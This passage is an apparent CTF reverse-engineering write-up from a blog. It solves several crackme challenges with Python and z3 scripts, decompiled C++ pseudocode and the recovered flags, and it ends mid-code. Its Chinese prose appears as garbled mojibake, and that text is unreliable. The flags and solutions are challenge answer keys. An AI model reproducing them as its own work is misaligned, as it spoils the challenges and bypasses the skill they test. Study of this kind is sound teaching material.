<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-1.png" alt="image-20231107162004359" style="zoom:50%;" />

<p>ç®€å•çš„ä½ç§»åŠ å¯† è§£é¢˜Pythonè„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="string">&#x27;Z`J[X^LMNO`PPJPVQRSIUTJ]IMNOZKMM&#x27;</span></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> key:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(each) - <span class="number">7</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#SYCTQWEFGHYIICIOJKLBNMCVBFGHSDFF</span></span><br></pre></td></tr></table></figure>

<h3 id="Easymath-z3-solverç®€å•ä½¿ç”¨"><a href="#Easymath-z3-solverç®€å•ä½¿ç”¨" class="headerlink" title="Easymath | z3-solverç®€å•ä½¿ç”¨"></a>Easymath | z3-solverç®€å•ä½¿ç”¨</h3><p>ExinfoæŸ¥åˆ°æ— å£³ 64ä½winç¨‹åº IDA64æ‰“å¼€</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-2.png" alt="image-20231107162748924"></p>
<ol>
<li>checkå‡½æ•°é€»è¾‘ç®€å• ä¸åˆ†æ(</li>
<li>checkpositionå‡½æ•°é€»è¾‘ä¹Ÿç®€å• ä¸åˆ†æ(</li>
<li>exchangeå‡½æ•°</li>
</ol>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-3.png" alt="image-20231107163319234" style="zoom:50%;" />

<p>â€‹	ä¸ç†è§£ 26è¡Œä¹‹å‰çš„ä»£ç ä½œç”¨ ä½†æ˜¯å¹¶ä¸å½±å“åˆ†æ(</p>
<p>â€‹	numberåœ¨å†…å­˜ç©ºé—´ä¸­æ¯ä¸ªæœ‰æ•ˆå…ƒç´ ä¹‹é—´æ’å…¥ä¸‰ä¸ª0</p>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-4.png" alt="image-20231107163601963" style="zoom:45%;" />

<p>â€‹	ä¸ä»£ç ä¸­çš„<code>p_number[i] = number_[4 * v10]</code>å¯¹åº” æœ€åä¸€ä¸ªå¾ªç¯çš„ä½œç”¨å°±æ˜¯å°†å­—ç¬¦åœ¨tableä¸­çš„ä½ç½®æ˜ å°„åˆ°è¿™äº›æœ‰æ•ˆå…ƒç´ ä¸Š</p>
<p>å›åˆ°ä¸»å‡½æ•° ä¸»è¦çš„æ¯”è¾ƒé€»è¾‘å°±æ˜¯ç»è¿‡æ˜ å°„åçš„<code>position</code>ä½œä¸ºä¸€ä¸ª5é˜¶æ–¹é˜µä¸å¦ä¸€ä¸ª5é˜¶æ–¹é˜µ<code>matrix</code>ç”¨ç‰¹æ®Šçš„çŸ©é˜µä¹˜æ³•æ³•åˆ™ç›¸ä¹˜å¾—åˆ°çš„çŸ©é˜µä¸å•ä½çŸ©é˜µç›¸æ¯” ä»¥ä¸‹æ˜¯Pythonä»£ç å®ç° å…¶ä¸­<code>n</code>ä¸ºçŸ©é˜µçš„é˜¶æ•°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        result[i][j] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            result[i][j] = (M1[i][k] * M2[k][j] + result[i][j]) % <span class="number">0x20</span></span><br></pre></td></tr></table></figure>

<p>é™¤æ­¤ä¹‹å¤–ä¸»å‡½æ•°ä¸­è¿˜èƒ½çœ‹åˆ°ä¸ºäº†é˜²æ­¢å‡ºç°å¤šè§£ç»™å‡ºçš„flagæç¤º(åŠ¨æ€è°ƒè¯•æ—¶å‘ç°å…¶ä¸ºflagä¸­çš„å…ƒç´  é‡æ„ä¸ºæ•°ç»„å¯ä»¥å°†å˜é‡åä»å†…å­˜åœ°å€å˜ä¸ºæ•°ç»„) å¯ä»¥ä½¿ç”¨çˆ†ç ´çš„æ–¹å¼è§£å‡ºflag ä¹Ÿå¯ä»¥ä½¿ç”¨z3-solveråº“è§£å‡º </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">table = <span class="string">&#x27;01234_asdzxcpoityumnbAOZWXGMY&#x27;</span></span><br><span class="line">matrix  = [<span class="number">18</span>, <span class="number">29</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">27</span>, </span><br><span class="line">            <span class="number">8</span>, <span class="number">31</span>,  <span class="number">8</span>, <span class="number">23</span>, <span class="number">30</span>, </span><br><span class="line">           <span class="number">29</span>,  <span class="number">3</span>, <span class="number">28</span>, <span class="number">10</span>, <span class="number">21</span>, </span><br><span class="line">           <span class="number">18</span>, <span class="number">29</span>,  <span class="number">8</span>, <span class="number">16</span>, <span class="number">28</span>, </span><br><span class="line">           <span class="number">11</span>, <span class="number">30</span>,  <span class="number">7</span>, <span class="number">20</span>,  <span class="number">7</span>]</span><br><span class="line">v7      = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line">           <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line">           <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line">           <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, </span><br><span class="line">           <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">num     = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>]</span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    mysolver = Solver()</span><br><span class="line">    position = IntVector(<span class="string">&#x27;position&#x27;</span>, <span class="number">5</span>)</span><br><span class="line">    <span class="keyword">if</span> w == <span class="number">0</span>:</span><br><span class="line">        mysolver.add(position[<span class="number">1</span>] == <span class="number">19</span>)</span><br><span class="line">    <span class="keyword">elif</span> w == <span class="number">1</span>:</span><br><span class="line">        mysolver.add(position[<span class="number">2</span>] == <span class="number">22</span>)</span><br><span class="line">    <span class="keyword">elif</span> w == <span class="number">3</span>:</span><br><span class="line">        mysolver.add(position[<span class="number">2</span>] == <span class="number">22</span>)</span><br><span class="line">    mysolver.add(And([Or([position[i] == val <span class="keyword">for</span> val <span class="keyword">in</span> num]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        expr = IntVal(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            expr = (expr + position[k] * matrix[<span class="number">5</span> * k + j]) % <span class="number">0x20</span></span><br><span class="line">        mysolver.add(expr == v7[<span class="number">5</span> * w + j])</span><br><span class="line">    result = mysolver.check()</span><br><span class="line">    <span class="keyword">if</span> result == sat:</span><br><span class="line">        m = mysolver.model()</span><br><span class="line">        position_values = [m[position[i]].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> position_values:</span><br><span class="line">            <span class="built_in">print</span>(table[num.index(each)], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="comment">#xtd4co_ymiunbbx3Aypsmbzii</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;No solution&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>éœ€è¦æ³¨æ„çš„æ˜¯ å¯ä»¥ä¸€æ¬¡æ€§çˆ†ç ´å…¨éƒ¨ä¸ç¡®å®šçš„22ä¸ªå…ƒç´  ä½†è¿™æ ·ä¼šä½¿å¤æ‚åº¦æå‡åˆ°29^22(æˆ‘çŒœçš„) è€Œæ¯ä¸€æ¬¡è¿ç®—åªç”¨åˆ°<code>position</code>ä¸­çš„ä¸€è¡Œå…ƒç´  æ•…å¯ä»¥ä¸€è¡Œä¸€è¡Œåœ°çˆ†ç ´ å¯ä»¥å°†å¤æ‚åº¦é™ä½åˆ°5*29^5(æˆ‘çŒœçš„)æ‰€ä»¥é€‰æ‹©ä¸€è¡Œä¸€è¡Œçˆ†ç ´(z3å­¦ä¹ ç¬”è®°å¦å†™)</p>
<h3 id="luck-ç®€å•çˆ†ç ´"><a href="#luck-ç®€å•çˆ†ç ´" class="headerlink" title="luck | ç®€å•çˆ†ç ´"></a>luck | ç®€å•çˆ†ç ´</h3><p>ExinfoæŸ¥åˆ°æ— å£³ 64ä½winç¨‹åº IDA64æ‰“å¼€</p>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-5.png" alt="image-20231107181356855" style="zoom: 67%;" />

<p>ä¸»å‡½æ•°å®šä¹‰äº†ä¸€ä¸ª<code>unsigned __int8</code>ç±»å‹åœ°æ•°ç»„ è¿™ä¸ªæ•°æ®ç±»å‹çš„å¤§å°å’Œ<code>char</code>ä¸€æ · <code>qmemcpy(cmp_data, &quot;\r\a&quot;, 2);</code>è¿™å¥å®é™…ä¸Šåªå°†<code>&quot;\r\a&quot;</code>ä¸­åœ°å‰ä¸¤ä¸ªå­—ç¬¦å¤åˆ¶åˆ°äº†<code>cmp_data</code>çš„æœ«å°¾ æ•°ç»„åä»£è¡¨é¦–å…ƒç´ åœ°å€ æ‰€ä»¥</p>
<p>cmp_data[0] &#x3D; â€˜\â€˜</p>
<p>cmp_data[1] &#x3D; â€˜râ€™</p>
<p>åŒç†<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-6.png" alt="image-20231107181921189" style="zoom: 50%;" /></p>
<p>å°†<code>&quot;o96*#&quot;</code>æ·»åŠ åˆ°äº†<code>cmp_data</code>çš„ç¬¬37ä¸ªå…ƒç´ åŠä¹‹å</p>
<p>(å…¶å®æœ€ç®€å•çš„æ–¹å¼æ˜¯åŠ¨æ€è°ƒè¯•ç›´æ¥æŸ¥çœ‹cmp_dataä¸­çš„æ•°æ®)</p>
<p>ä¸»å‡½æ•°ä¸­çš„åŠ å¯†å‡½æ•°ä¸ºç”¨é€’å½’å®ç°çš„ç­‰å·®æ•°åˆ—æ±‚å’Œ<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-145103.png" alt="image-20240223145103900"></p>
<p>ä¸ç®¡è¾“å…¥çš„æ•°å­—æ˜¯ä»€ä¹ˆéƒ½ä¼šè¾“å‡ºåŠ å¯†åçš„å¯†æ–‡ æ ¹æ®flagå‰3ä¸ªå›ºå®šçš„å­—ç¬¦çˆ†ç ´flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = [<span class="number">13</span>,   <span class="number">7</span>,  <span class="number">29</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    result = <span class="built_in">int</span>(i * (i + <span class="number">1</span>) / <span class="number">2</span>) % <span class="number">0xD3</span></span><br><span class="line">    <span class="keyword">if</span> key[<span class="number">0</span>] ^ (result) == <span class="built_in">ord</span>(<span class="string">&#x27;S&#x27;</span>) <span class="keyword">and</span> key[<span class="number">1</span>] ^ (result) == <span class="built_in">ord</span>(<span class="string">&#x27;Y&#x27;</span>) <span class="keyword">and</span> key[<span class="number">2</span>] ^ (result) == <span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="comment"># 69</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>åœ¨ç¨‹åºä¸­è¾“å…¥æ•°å­—å¾—åˆ°flag</p>
<h3 id="ç æ ‘-å®‰å“é€†å‘"><a href="#ç æ ‘-å®‰å“é€†å‘" class="headerlink" title="ç æ ‘ | å®‰å“é€†å‘"></a>ç æ ‘ | å®‰å“é€†å‘</h3><p>ä¸»å‡½æ•°çš„é€»è¾‘å¾ˆç®€å•<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-7.png" alt="image-20231107183128020"></p>
<p>å°±æ˜¯è°ƒç”¨ä¸€ä¸ªå‡½æ•°ä¼ å…¥è¾“å…¥çš„å­—ç¬¦ä¸²å’Œkey åˆ¤æ–­è¿”å›å€¼ è¿™ä¸ªå‡½æ•°åœ¨<code>ezreeee</code>åº“ä¸­ å¯¼å‡ºè¿™ä¸ªåº“ç”¨IDAåˆ†æ</p>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426-8.png" alt="image-20231107183407674" style="zoom:67%;" />

<p>åœ¨å‡½æ•°åˆ—è¡¨ä¸­æ£€ç´¢<code>I0o0I</code>å‡½æ•° ä¼ å…¥çš„å‚æ•°æœ‰4ä¸ª å…¶ä¸­æœ‰2ä¸ªæ˜¯<code>JNIEnv</code>å’Œ<code>jobject</code> JNIæ˜¯ä¸ºäº†è®©JAVAå’ŒC&#x2F;C++äº’é€šæ„å»ºçš„ç¯å¢ƒ jxxxxxæ˜¯ä¸ºäº†ä¸ä¸CåŸæœ‰çš„ç±»å‹å†²çª æ‰€ä»¥ä»ä¸‹é¢çš„2ä¸ª<code>jstring_2unsigchar</code>å‡½æ•°ä¹Ÿå¯ä»¥çœ‹å‡º<code>a3</code>å’Œ<code>a4</code>åˆ†åˆ«ä¸ºjebä¼ªä»£ç ä¸­çœ‹åˆ°çš„ä¸¤ä¸ªå‚æ•°ä¸åŠ å¯†åçš„è¾“å…¥å¯¹æ¯”çš„æ˜¯ä»å†…å­˜0x14900ä¸­å¤åˆ¶çš„35ä¸ªå­—èŠ‚å‹æ•°æ® ä»¥ä¸‹æ˜¯è§£å¯†è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = [<span class="number">0</span>,  <span class="number">32</span>,  <span class="number">32</span>,  <span class="number">23</span>,  <span class="number">27</span>,  <span class="number">54</span>,  <span class="number">14</span>,  <span class="number">54</span>,  <span class="number">38</span>,  <span class="number">23</span>, </span><br><span class="line">    <span class="number">4</span>,  <span class="number">42</span>,  <span class="number">41</span>,   <span class="number">7</span>,  <span class="number">38</span>,  <span class="number">21</span>,  <span class="number">82</span>,  <span class="number">51</span>,  <span class="number">45</span>,  <span class="number">15</span>, </span><br><span class="line">   <span class="number">58</span>,  <span class="number">39</span>,  <span class="number">17</span>,   <span class="number">6</span>,  <span class="number">51</span>,   <span class="number">7</span>,  <span class="number">70</span>,  <span class="number">23</span>,  <span class="number">61</span>,  <span class="number">10</span>, </span><br><span class="line">   <span class="number">60</span>,  <span class="number">56</span>,  <span class="number">46</span>,  <span class="number">34</span>,  <span class="number">24</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>]</span><br><span class="line">to_mod = <span class="string">&quot;Sycloverforerver&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> key:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(each ^ <span class="built_in">ord</span>(to_mod[i % <span class="number">7</span>])), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"><span class="comment">#SYC&#123;t@ke_thE_bul1_By_the_h0rns_TAT&#125;SycloveSyclov</span></span><br></pre></td></tr></table></figure>

<h3 id="å¬è¯´cppå¾ˆéš¾ï¼Ÿ-C-é€†å‘"><a href="#å¬è¯´cppå¾ˆéš¾ï¼Ÿ-C-é€†å‘" class="headerlink" title="å¬è¯´cppå¾ˆéš¾ï¼Ÿ | C++é€†å‘"></a>å¬è¯´cppå¾ˆéš¾ï¼Ÿ | C++é€†å‘</h3><p>ExinfoæŸ¥åˆ°æ— å£³ 64ä½winç¨‹åº IDA64æ‰“å¼€ ä¼ªä»£ç å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *addr_nowChar; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> now_char; <span class="comment">// ebx</span></span><br><span class="line">  _BYTE *v8; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// ebx</span></span><br><span class="line">  __int64 v11; <span class="comment">// rax</span></span><br><span class="line">  __int64 v12; <span class="comment">// rax</span></span><br><span class="line">  __int64 m; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  __int64 k; <span class="comment">// [rsp+28h] [rbp-58h] BYREF</span></span><br><span class="line">  <span class="type">char</span> copy_flag[<span class="number">32</span>]; <span class="comment">// [rsp+30h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> be_encoded[<span class="number">48</span>]; <span class="comment">// [rsp+50h] [rbp-30h] BYREF</span></span><br><span class="line">  _BYTE enc[<span class="number">32</span>]; <span class="comment">// [rsp+80h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v19[<span class="number">40</span>]; <span class="comment">// [rsp+A0h] [rbp+20h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input_flag[<span class="number">40</span>]; <span class="comment">// [rsp+140h] [rbp+C0h] BYREF</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+168h] [rbp+E8h] BYREF</span></span><br><span class="line">  __int64 v22; <span class="comment">// [rsp+170h] [rbp+F0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len; <span class="comment">// [rsp+17Ch] [rbp+FCh]</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// [rsp+180h] [rbp+100h]</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// [rsp+184h] [rbp+104h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+188h] [rbp+108h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18Ch] [rbp+10Ch]</span></span><br><span class="line"></span><br><span class="line">  _main(argc, argv, envp);</span><br><span class="line">  v3 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(refptr__ZSt4cout, <span class="string">&quot;place input your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v3, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string(input_flag);</span><br><span class="line">  <span class="built_in">memset</span>(v19, <span class="number">0</span>, <span class="keyword">sizeof</span>(v19));</span><br><span class="line">  v19[<span class="number">0</span>] = <span class="number">0x4D</span>;</span><br><span class="line">  v19[<span class="number">1</span>] = <span class="number">0x5F</span>;</span><br><span class="line">  v19[<span class="number">2</span>] = <span class="number">0x3D</span>;</span><br><span class="line">  v19[<span class="number">3</span>] = <span class="number">0xFFFFFF85</span>;</span><br><span class="line">  v19[<span class="number">4</span>] = <span class="number">0x37</span>;</span><br><span class="line">  v19[<span class="number">5</span>] = <span class="number">0x68</span>;</span><br><span class="line">  v19[<span class="number">6</span>] = <span class="number">0x73</span>;</span><br><span class="line">  v19[<span class="number">7</span>] = <span class="number">0x57</span>;</span><br><span class="line">  v19[<span class="number">8</span>] = <span class="number">0x27</span>;</span><br><span class="line">  v19[<span class="number">9</span>] = <span class="number">0x68</span>;</span><br><span class="line">  v19[<span class="number">10</span>] = <span class="number">0x51</span>;</span><br><span class="line">  v19[<span class="number">11</span>] = <span class="number">0x59</span>;</span><br><span class="line">  v19[<span class="number">12</span>] = <span class="number">0x7F</span>;</span><br><span class="line">  v19[<span class="number">13</span>] = <span class="number">0x26</span>;</span><br><span class="line">  v19[<span class="number">14</span>] = <span class="number">0x6B</span>;</span><br><span class="line">  v19[<span class="number">15</span>] = <span class="number">0x59</span>;</span><br><span class="line">  v19[<span class="number">16</span>] = <span class="number">0x73</span>;</span><br><span class="line">  v19[<span class="number">17</span>] = <span class="number">0x57</span>;</span><br><span class="line">  v19[<span class="number">18</span>] = <span class="number">0x55</span>;</span><br><span class="line">  v19[<span class="number">19</span>] = <span class="number">0x5B</span>;</span><br><span class="line">  v19[<span class="number">20</span>] = <span class="number">0x59</span>;</span><br><span class="line">  v19[<span class="number">21</span>] = <span class="number">0x6F</span>;</span><br><span class="line">  v19[<span class="number">22</span>] = <span class="number">0x6A</span>;</span><br><span class="line">  v19[<span class="number">23</span>] = <span class="number">0x59</span>;</span><br><span class="line">  v19[<span class="number">24</span>] = <span class="number">0x27</span>;</span><br><span class="line">  v19[<span class="number">25</span>] = <span class="number">0x57</span>;</span><br><span class="line">  v19[<span class="number">26</span>] = <span class="number">0x72</span>;</span><br><span class="line">  v19[<span class="number">27</span>] = <span class="number">0x57</span>;</span><br><span class="line">  v19[<span class="number">28</span>] = <span class="number">0x4F</span>;</span><br><span class="line">  v19[<span class="number">29</span>] = <span class="number">0x57</span>;</span><br><span class="line">  v19[<span class="number">30</span>] = <span class="number">0x78</span>;</span><br><span class="line">  v19[<span class="number">31</span>] = <span class="number">0x78</span>;</span><br><span class="line">  v19[<span class="number">32</span>] = <span class="number">0xFFFFFF83</span>;</span><br><span class="line">  <span class="built_in">std</span>::operator&gt;&gt;&lt;<span class="type">char</span>&gt;(refptr__ZSt3cin, input_flag);</span><br><span class="line">  len = <span class="built_in">std</span>::<span class="built_in">string</span>::size(input_flag);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;::<span class="built_in">vector</span>(enc);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;::push_back(enc, &amp;v19[i]);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">34</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;                                             <span class="comment">// å¤åˆ¶v19åˆ°encä¸­</span></span><br><span class="line">  encode::encode(be_encoded, len, input_flag, <span class="number">10</span>);<span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// be_encoded[0]    = len(flag)</span></span><br><span class="line">                                                <span class="comment">// be_encoded[8...] = input_flag</span></span><br><span class="line">                                                <span class="comment">// be_encoded[40]   = 10</span></span><br><span class="line">                                                <span class="comment">// be_encoded[44]   = 10</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;::<span class="built_in">vector</span>(copy_flag);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = j;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt;= <span class="built_in">std</span>::<span class="built_in">string</span>::size(input_flag) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = <span class="built_in">std</span>::<span class="built_in">string</span>::operator[](input_flag, j);<span class="comment">// v5 = input_flag[j]</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;::push_back(copy_flag, v5);</span><br><span class="line">  &#125;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;::begin(copy_flag);<span class="comment">// for k in copy_flag</span></span><br><span class="line">        ;</span><br><span class="line">        __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;&gt;::operator++(&amp;k, <span class="number">0</span>i64) )</span><br><span class="line">  &#123;</span><br><span class="line">    v21 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;::end(copy_flag);</span><br><span class="line">    <span class="keyword">if</span> ( !__gnu_cxx::operator!=&lt;<span class="type">char</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;&gt;(&amp;k, &amp;v21) )<span class="comment">// è¯»åˆ°æœ€åä¸€ä¸ªå­—ç¬¦æ—¶é€€å‡º</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    addr_nowChar = __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;&gt;::operator*(&amp;k);</span><br><span class="line">    *addr_nowChar += be_encoded[<span class="number">44</span>];</span><br><span class="line">    now_char = *__gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;&gt;::operator*(&amp;k);</span><br><span class="line">    v8 = __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;&gt;::operator*(&amp;k);</span><br><span class="line">    *v8 = text_67(be_encoded, now_char);        <span class="comment">// now_char += 10</span></span><br><span class="line">                                                <span class="comment">// now_char = (10 ^ now_char) - 10</span></span><br><span class="line">                                                <span class="comment">// now_char = v19[i]</span></span><br><span class="line">  &#125;</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( m = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;::begin(copy_flag);</span><br><span class="line">        ;</span><br><span class="line">        __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;&gt;::operator++(&amp;m, <span class="number">0</span>i64) )</span><br><span class="line">  &#123;</span><br><span class="line">    v22 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;::end(copy_flag);</span><br><span class="line">    <span class="keyword">if</span> ( !__gnu_cxx::operator!=&lt;<span class="type">char</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;&gt;(&amp;m, &amp;v22) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = *__gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;&gt;::operator*(&amp;m);</span><br><span class="line">    <span class="keyword">if</span> ( v9 == *<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;::operator[](enc, v24) )</span><br><span class="line">      ++v25;</span><br><span class="line">    v10 = *__gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;&gt;::operator*(&amp;m);</span><br><span class="line">    <span class="keyword">if</span> ( v10 != *<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;::operator[](enc, v24) )</span><br><span class="line">      --v25;</span><br><span class="line">    ++v24;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v25 &gt; <span class="number">32</span> )                               <span class="comment">// v25ç»Ÿè®¡æ­£ç¡®çš„å­—ç¬¦</span></span><br><span class="line">  &#123;</span><br><span class="line">    v11 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span 